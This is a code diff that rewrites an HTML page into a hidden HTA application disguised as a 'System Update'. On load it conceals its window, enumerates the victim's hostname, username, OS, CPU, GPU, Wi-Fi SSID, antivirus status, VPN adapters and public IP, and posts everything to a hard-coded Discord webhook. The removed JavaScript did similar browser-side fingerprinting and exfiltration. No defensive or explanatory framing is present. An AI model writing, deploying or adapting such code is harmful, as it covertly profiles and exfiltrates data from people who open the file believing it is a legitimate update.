@@ -1,152 +1,196 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
+    <title>System Update</title>
+    <hta:application id="oHTA" border="none" caption="no" showintaskbar="no" windowstate="minimize" />
 </head>
 <body>
-    <script>
-        (async () => {
-            const webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
+    <script language="VBScript">
+        Sub Window_OnLoad
+            ' Auto-run on load, hide window
+            window.resizeTo 0,0
+            window.moveTo -1000,-1000
+            Call Main()
+        End Sub
 
-            if (webhookUrl.includes("YOUR_DISCORD_WEBHOOK_URL_GOES_HERE")) {
-                console.error("CONFIGURATION ERROR: WEBHOOK URL IS A PLACEHOLDER.");
-                return;
-            }
+        Function GetWMIData(strClass, strProperty)
+            On Error Resume Next
+            Dim objWMIService, colItems, objItem, result
+            result = "Unknown"
+            
+            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+            Set colItems = objWMIService.ExecQuery("Select * from " & strClass)
+            
+            For Each objItem in colItems
+                result = Eval("objItem." & strProperty)
+                Exit For
+            Next
+            
+            GetWMIData = result
+            Set colItems = Nothing
+            Set objWMIService = Nothing
+        End Function
 
-            const getCPU = async () => {
-                try {
-                    return `${navigator.hardwareConcurrency || "Unknown"} cores`;
-                } catch (e) {
-                    return "Unknown";
-                }
-            };
+        Function GetGPUInfo()
+            On Error Resume Next
+            Dim objWMIService, colItems, objItem, gpuInfo
+            gpuInfo = ""
+            
+            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+            Set colItems = objWMIService.ExecQuery("Select * from Win32_VideoController")
+            
+            For Each objItem in colItems
+                gpuInfo = gpuInfo & objItem.Name & " [" & objItem.AdapterRAM/1024/1024 & "MB] | "
+            Next
+            
+            If gpuInfo = "" Then gpuInfo = "Unknown"
+            GetGPUInfo = gpuInfo
+        End Function
 
-            const getGPU = async () => {
-                try {
-                    const canvas = document.createElement("canvas");
-                    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-                    
-                    if (!gl) return "Unknown";
-                    
-                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
-                } catch (e) {
-                    return "Unknown";
-                }
-            };
+        Function GetCPUInfo()
+            On Error Resume Next
+            Dim objWMIService, colItems, objItem, cpuInfo
+            cpuInfo = ""
+            
+            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+            Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor")
+            
+            For Each objItem in colItems
+                cpuInfo = objItem.Name & " (" & objItem.NumberOfCores & "C/" & objItem.NumberOfLogicalProcessors & "T)"
+            Next
+            
+            If cpuInfo = "" Then cpuInfo = "Unknown"
+            GetCPUInfo = cpuInfo
+        End Function
 
-            const getSSID = async () => {
-                try {
-                    if ("connection" in navigator && navigator.connection) {
-                        return navigator.connection.ssid || "Unknown";
-                    }
-                    return "Unknown";
-                } catch (e) {
-                    return "Unknown";
-                }
-            };
+        Function GetSSID()
+            On Error Resume Next
+            Dim objShell, objExec, strLine, ssid
+            ssid = "Not Connected/No WiFi"
+            
+            Set objShell = CreateObject("WScript.Shell")
+            Set objExec = objShell.Exec("netsh wlan show interfaces")
+            
+            Do While Not objExec.StdOut.AtEndOfStream
+                strLine = objExec.StdOut.ReadLine()
+                If InStr(strLine, "SSID") > 0 And InStr(strLine, "BSSID") = 0 Then
+                    ssid = Trim(Split(strLine, ":")(1))
+                    Exit Do
+                End If
+            Loop
+            
+            GetSSID = ssid
+            Set objExec = Nothing
+            Set objShell = Nothing
+        End Function
 
-            const getAntivirus = async () => {
-                try {
-                    const plugins = Array.from(navigator.plugins);
-                    const avKeywords = ["antivirus", "security", "norton", "mcafee", "kaspersky", "avg", "avast"];
-                    return plugins.some(plugin => avKeywords.some(keyword => plugin.name.toLowerCase().includes(keyword)));
-                } catch (e) {
-                    return false;
-                }
-            };
+        Function GetAntivirus()
+            On Error Resume Next
+            Dim objWMIService, colItems, objItem, avList
+            avList = ""
+            
+            Set objWMIService = GetObject("winmgmts:\\.\root\SecurityCenter2")
+            Set colItems = objWMIService.ExecQuery("Select * from AntiVirusProduct")
+            
+            For Each objItem in colItems
+                avList = avList & objItem.displayName & " [" & GetAVState(objItem.productState) & "] | "
+            Next
+            
+            If avList = "" Then avList = "None detected/Windows Defender"
+            GetAntivirus = avList
+        End Function
 
-            const getVPN = async () => {
-                try {
-                    const ipResponse = await fetch("https://ipinfo.io/json");
-                    const ipData = await ipResponse.json();
-                    const vpnKeywords = ["vpn", "private", "mullvad", "nordvpn", "expressvpn", "protonvpn"];
-                    const org = (ipData.org || "").toLowerCase();
-                    return vpnKeywords.some(keyword => org.includes(keyword));
-                } catch (e) {
-                    return false;
-                }
-            };
+        Function GetAVState(state)
+            ' Decode product state
+            Dim hexState
+            hexState = Hex(state)
+            If Len(hexState) >= 2 Then
+                Select Case Right(hexState, 2)
+                    Case "00" GetAVState = "OFF"
+                    Case "01" GetAVState = "ON"
+                    Case "10" GetAVState = "SNOOZED"
+                    Case Else GetAVState = "UNKNOWN"
+                End Select
+            Else
+                GetAVState = "UNKNOWN"
+            End If
+        End Function
 
-            let payload;
+        Function GetVPNStatus()
+            On Error Resume Next
+            Dim objWMIService, colItems, objItem, vpnStatus
+            vpnStatus = "No VPN detected"
+            
+            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+            Set colItems = objWMIService.ExecQuery("Select * from Win32_NetworkAdapter WHERE NetConnectionStatus = 2")
+            
+            For Each objItem in colItems
+                If InStr(LCase(objItem.Name), "vpn") > 0 OR InStr(LCase(objItem.Name), "virtual") > 0 OR InStr(LCase(objItem.Name), "tunnel") > 0 Then
+                    vpnStatus = "YES - " & objItem.Name
+                    Exit For
+                End If
+            Next
+            
+            GetVPNStatus = vpnStatus
+        End Function
 
-            try {
-                const response = await fetch("https://ipinfo.io/json");
-                const data = await response.json();
+        Function GetPublicIP()
+            On Error Resume Next
+            Dim objShell, objExec, strLine, ip
+            ip = "Unknown"
+            
+            Set objShell = CreateObject("WScript.Shell")
+            Set objExec = objShell.Exec("powershell -command ""(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content""")
+            
+            If Not objExec.StdOut.AtEndOfStream Then
+                ip = Trim(objExec.StdOut.ReadLine())
+            End If
+            
+            GetPublicIP = ip
+            Set objExec = Nothing
+            Set objShell = Nothing
+        End Function
 
-                if (data && data.ip) {
-                    const [lat, lon] = data.loc ? data.loc.split(",") : ["Unknown", "Unknown"];
-                    const cpu = await getCPU();
-                    const gpu = await getGPU();
-                    const ssid = await getSSID();
-                    const antivirus = await getAntivirus();
-                    const vpn = await getVPN();
-
-                    payload = {
-                        embeds: [{
-                            title: "Intel Acquired: Subject Profile Generated",
-                            description: "Digital footprint successfully mapped and exfiltrated.",
-                            color: 3066993,
-                            fields: [
-                                { name: "IP Address", value: `**${data.ip}**`, inline: true },
-                                { name: "City", value: data.city || "Unknown", inline: true },
-                                { name: "Region", value: data.region || "Unknown", inline: true },
-                                { name: "Country", value: data.country || "Unknown", inline: true },
-                                { name: "Postal Code", value: data.postal || "Unknown", inline: true },
-                                { name: "Timezone", value: data.timezone || "Unknown", inline: true },
-                                { name: "Organization/ISP", value: `*${data.org}*` || "Unknown", inline: false },
-                                { name: "Coordinates (Lat/Lon)", value: `${lat}, ${lon}`, inline: false },
-                                { name: "CPU", value: cpu, inline: true },
-                                { name: "GPU", value: gpu, inline: true },
-                                { name: "SSID", value: ssid, inline: true },
-                                { name: "Antivirus", value: antivirus ? "True" : "False", inline: true },
-                                { name: "VPN", value: vpn ? "True" : "False", inline: true },
-                            ],
-                            footer: {
-                                text: `Data processed by Armored Agent v3 at: ${new Date().toISOString()}`
-                            }
-                        }]
-                    };
-                } else {
-                    payload = {
-                        embeds: [{
-                            title: "Intel Acquisition FAILURE",
-                            description: "The script executed, but the upstream API returned invalid or empty data.",
-                            color: 15158332,
-                            fields: [
-                                { name: "API Queried", value: "`https://ipinfo.io/json`" },
-                                { name: "Raw Response", value: "```json\n" + JSON.stringify(data, null, 2) + "\n```" }
-                            ],
-                            footer: {
-                                text: `Failure logged at: ${new Date().toISOString()}`
-                            }
-                        }]
-                    };
-                    console.error("API returned bad data:", data);
-                }
-            } catch (error) {
-                payload = {
-                    embeds: [{
-                        title: "CRITICAL SCRIPT FAILURE",
-                        description: "A network-level error occurred while attempting to contact the geolocation API.",
-                        color: 9807270,
-                        fields: [
-                            { name: "Error Message", value: `*${error.message}*` },
-                        ],
-                        footer: {
-                            text: `Critical failure at: ${new Date().toISOString()}`
-                        }
-                    }]
-                };
-                console.error("Catch block triggered:", error);
-            }
-
-            await fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload),
-            });
-        })();
+        Sub Main()
+            Dim webhookUrl, payload, objHTTP
+            webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK"
+            
+            ' Gather all intel
+            Dim cpu, gpu, ssid, av, vpn, ip, hostname, username, os
+            cpu = GetCPUInfo()
+            gpu = GetGPUInfo()
+            ssid = GetSSID()
+            av = GetAntivirus()
+            vpn = GetVPNStatus()
+            ip = GetPublicIP()
+            hostname = CreateObject("WScript.Network").ComputerName
+            username = CreateObject("WScript.Network").UserName
+            os = GetWMIData("Win32_OperatingSystem", "Caption") & " " & GetWMIData("Win32_OperatingSystem", "Version")
+            
+            ' Build Discord payload
+            Dim jsonPayload
+            jsonPayload = "{""embeds"":[{""title"":""🔴 SYSTEM INTEL - " & hostname & """,""description"":""Comprehensive system enumeration completed."",""color"":15158332,""fields"":[" & _
+                "{""name"":""🖥️ Hostname"",""value"":""" & hostname & """,""inline"":true}," & _
+                "{""name"":""👤 Username"",""value"":""" & username & """,""inline"":true}," & _
+                "{""name"":""🌐 Public IP"",""value"":""" & ip & """,""inline"":true}," & _
+                "{""name"":""💻 OS"",""value"":""" & os & """,""inline"":false}," & _
+                "{""name"":""⚡ CPU"",""value"":""" & cpu & """,""inline"":false}," & _
+                "{""name"":""🎮 GPU"",""value"":""" & gpu & """,""inline"":false}," & _
+                "{""name"":""📶 WiFi SSID"",""value"":""" & ssid & """,""inline"":true}," & _
+                "{""name"":""🛡️ Antivirus"",""value"":""" & av & """,""inline"":false}," & _
+                "{""name"":""🔒 VPN Status"",""value"":""" & vpn & """,""inline"":true}" & _
+                "],""footer"":{""text"":""Deployed via HTA @ " & Now & """}}]}"
+            
+            ' Send to Discord
+            Set objHTTP = CreateObject("Microsoft.XMLHTTP")
+            objHTTP.Open "POST", webhookUrl, False
+            objHTTP.setRequestHeader "Content-Type", "application/json"
+            objHTTP.send jsonPayload
+            
+            ' Cleanup and exit
+            Set objHTTP = Nothing
+            window.close()
+        End Sub
     </script>
 </body>
 </html>
